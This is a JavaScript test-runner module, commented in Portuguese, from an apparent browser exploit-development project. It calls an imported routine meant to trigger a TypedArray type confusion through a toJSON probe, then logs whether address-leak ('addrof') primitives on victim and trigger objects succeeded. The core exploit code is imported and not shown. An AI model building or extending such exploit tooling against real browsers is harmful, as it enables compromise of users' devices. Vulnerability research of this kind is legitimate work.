// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_TriggerObjectConfusion,   // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC    // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_TriggerObjectConfusion";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug com TypedArray Vítima (TriggerObjectConfusion) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_TriggerObjectConfusion(); 

    logS3(`   Total de chamadas da sonda toJSON durante o teste: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER); 
    
    if (result.errorOccurred) {
        logS3(`   RESULTADO: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
        document.title = `Heisenbug (TypedArray-TOC) ERR: ${result.errorOccurred.name}`;
    } else {
        logS3(`   RESULTADO: Completou. Detalhes da interação com trigger_object (se ocorreu): ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A'}`, "good", FNAME_RUNNER);
        logS3(`   Stringify Output (parsed, if obj): ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "info", FNAME_RUNNER);
        
        let heisenbugConfirmedOnTrigger = false;
        if (result.toJSON_details && result.toJSON_details.this_type === "[object Object]" && result.toJSON_details.trigger_id_match) {
            heisenbugConfirmedOnTrigger = true;
        }

        let anyAddrofSuccess = false;
        const addrofChecks = [
            { name: "VictimA", res: result.addrof_victim_A },
            { name: "VictimB", res: result.addrof_victim_B },
            { name: "TriggerA", res: result.addrof_controller_A }, // Usando os nomes de propriedade do objeto retornado
            { name: "TriggerB", res: result.addrof_controller_B }
        ];

        addrofChecks.forEach(check => {
            if (check.res && check.res.success) {
                 logS3(`     ADDROF ${check.name} SUCESSO! ${check.res.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
            } else if (check.res) {
                 logS3(`     ADDROF ${check.name} FALHOU: ${check.res.msg}`, "warn", FNAME_RUNNER);
            }
        });

        if (result.toJSON_details && result.toJSON_details.error) {
            logS3(`     ERRO INTERNO NA SONDA (durante confusão do trigger_object): ${result.toJSON_details.error}`, "warn", FNAME_RUNNER);
            document.title = `Heisenbug (TypedArray-TOC) toJSON_ERR`;
        } else if (heisenbugConfirmedOnTrigger) {
            logS3(`     !!!! TYPE CONFUSION NO trigger_object OBSERVADA !!!!`, "critical", FNAME_RUNNER);
            if (result.toJSON_details.writes_to_victim_buffer_view_attempted) { 
                logS3(`       Escritas na VÍTIMA (via trigger_object.victim_buffer_view) tentadas.`, "info");
            }
            if (result.toJSON_details.writes_to_trigger_object_attempted) { 
                 logS3(`       Escritas no trigger_object (this.marker_A/B) tentadas.`, "info");
            }
            if (!anyAddrofSuccess) {
                 document.title = `Heisenbug (TypedArray-TOC) Trigger TC, Addr Fail`;
            } else {
                 document.title = `Heisenbug (TypedArray-TOC) Addr SUCCESS!`;
            }
        } else if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC) || document.title.includes("Probing")) {
            if (!anyAddrofSuccess) {
                 document.title = `Heisenbug (TypedArray-TOC) Test OK`;
            }
        }
    }
    logS3(`   Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (TriggerObjectConfusion) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC}_MainOrchestrator`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (TriggerObjectConfusion) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && 
            !document.title.includes("SUCESSO") && !document.title.includes("Addr Fail") && 
            !document.title.includes("ERR") && !document.title.includes("Trigger TC")) { 
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC} Concluído`;
        }
    }
}
